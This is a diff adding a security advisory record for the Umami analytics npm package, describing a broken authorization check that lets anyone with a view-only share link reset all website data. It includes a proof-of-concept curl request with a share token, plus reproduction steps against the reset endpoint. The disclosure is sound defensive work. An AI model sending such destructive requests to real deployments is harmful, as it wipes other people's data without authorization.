@@ -1,0 +1,61 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-8www-cffh-4q98",
+  "modified": "2023-07-28T15:33:14Z",
+  "published": "2023-07-28T15:33:14Z",
+  "aliases": [
+
+  ],
+  "summary": "Anyone with a share link can RESET all website data in Umami",
+  "details": "### Summary\nAnyone with a share link (permissions to view) can reset the website data.\n\n### Details\nWhen a user navigates to a `/share/` URL, he receives a share token which is used for authentication. This token is later verified by `useAuth`. After the token is verified, the user can call most of the `GET` APIs that allow fetching stats about a website.\n\nThe `POST /reset` endpoint is secured using `canViewWebsite` which is the incorrect verification for such destructive action. This makes it possible to completly reset all website data ONLY with view permissions - [permalink](https://github.com/umami-software/umami/blob/7bfbe264852558a148c7741f8637ff2b266d48cd/pages/api/websites/%5Bid%5D/reset.ts#L22)\n\n\n### PoC\n```bash\ncurl -X POST 'https://analytics.umami.is/api/websites/b8250618-ccb5-47fb-8350-31c96169a198/reset' \\\n  -H 'authority: analytics.umami.is' \\\n  -H 'accept: application/json' \\\n  -H 'accept-language: en-US,en;q=0.9' \\\n  -H 'authorization: Bearer undefined' \\\n  -H 'cache-control: no-cache' \\\n  -H 'content-type: application/json' \\\n  -H 'pragma: no-cache' \\\n  -H 'referer: https://analytics.umami.is/share/bw6MFhkwpwEXFsbd/test' \\\n  -H 'sec-ch-ua: \"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"' \\\n  -H 'sec-ch-ua-mobile: ?0' \\\n  -H 'sec-ch-ua-platform: \"Linux\"' \\\n  -H 'sec-fetch-dest: empty' \\\n  -H 'sec-fetch-mode: cors' \\\n  -H 'sec-fetch-site: same-origin' \\\n  -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36' \\\n  -H 'x-umami-share-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3ZWJzaXRlSWQiOiJiODI1MDYxOC1jY2I1LTQ3ZmItODM1MC0zMWM5NjE2OWExOTgiLCJpYXQiOjE2OTAzNjkxOTl9.zTfwFrfggE5na7rOOgkUobEBm48AH_8WVyh2RgJGzcw' \\\n  --compressed\n```\n\nYou can reproduce this by:\n* Accessing a website using it's share link\n* Copy the `token` received from the the received from the `GET /share/{website-id}`\n* Send a POST request to `https://analytics.umami.is/api/websites/b8250618-ccb5-47fb-8350-31c96169a198/reset` with `x-umami-share-token: ` header equal to the token copied in the previous step\n* The website data is now cleared\n\n### Impact\nEveryone with an open share link exposed to the internet!",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "umami"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.3.1"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/umami-software/umami/security/advisories/GHSA-8www-cffh-4q98"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/umami-software/umami/commit/ec48a4e3250e9cefc481b339a90e6ceea6f1ec2b"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/umami-software/umami"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+
+    ],
+    "severity": "CRITICAL",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-07-28T15:33:14Z",
+    "nvd_published_at": null
+  }
+}
